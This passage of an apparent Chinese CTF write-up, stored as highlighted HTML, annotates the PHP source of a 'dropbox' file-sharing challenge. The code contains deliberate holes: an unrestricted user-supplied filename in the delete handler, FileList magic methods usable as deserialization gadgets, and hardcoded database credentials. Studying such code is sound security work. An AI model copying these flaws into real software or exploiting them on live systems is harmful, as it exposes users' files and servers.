class=\"token punctuation\">;</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">40</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 打开文件、调用delete方法删除文件</span>\n    <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">detele</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"success\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"error\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"success\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"error\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token double-quoted-string string\">\"File not exist\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<ul><li>注意这里没有限制访问目录</li></ul>\n<p>class.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbaddr</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbuser</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbpass</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"dropbox\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbaddr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 数据库连接</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t\t<span class=\"token shell-comment comment\"># 构造函数</span>\n        <span class=\"token keyword\">global</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">user_exist</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token shell-comment comment\"># 预处理，这里sql注入是不行的</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">store_result</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$count</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">num_rows</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$count</span> <span class=\"token operator\">===</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">add_user</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">user_exist</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"SiAchGHmFx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"ss\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">verify_user</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">user_exist</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"SiAchGHmFx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"SELECT `password` FROM `users` WHERE `username` = ?;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$expect</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$expect</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$expect</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileList</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$results</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$funcs</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 构造函数</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">results</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">funcs</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filenames</span> <span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># filenames：path下的文件列表</span>\n\n        <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filenames</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token shell-comment comment\"># 寻找键值'.'，返回键名</span>\n        <span class=\"token function\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filenames</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 删掉这个键值对</span>\n        <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"..\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filenames</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filenames</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$filenames</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">files</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token shell-comment comment\"># files存储一个用户上传路径下所有的文件对象</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">results</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token shell-comment comment\"># result每个文件名都是一个键值，每个键值对应一个数组</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 对象调用一个不存在的方法时调用</span>\n        <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">funcs</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 把不存在的函数名存入funcs(args是不存在函数所带的参数)</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">results</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token shell-comment comment\"># results[文件名][方法名]= 调用file类对应的方法 </span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$table</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;thead&gt;&lt;tr&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">funcs</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 遍历funcs中的每个func</span>\n            <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;th scope=\"col\" class=\"text-center\"&gt;'</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">'&lt;/th&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;/thead&gt;&lt;tbody&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">results</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 遍历results中的每个键值对</span>\n            <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;tr&gt;'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \t<span class=\"token shell-comment comment\"># 遍历result，得到func和对应的结果</span>\n                <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;td class=\"text-center\"&gt;'</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">'&lt;/td&gt;'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;td class=\"text-center\" filename=\"'</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">'\"&gt;&lt;a href=\"#\" class=\"download\"&gt;涓嬭浇&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$table</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'&lt;/tr&gt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$table</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">File</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 文件存在且不是文件目录则返回true</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 返回basename</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$size</span> <span class=\"token operator\">=</span> <span class=\"token function\">filesize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$units</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">' B'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">' KB'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">' MB'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">' GB'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">' TB'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$size</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">1024</span> <span class=\"token 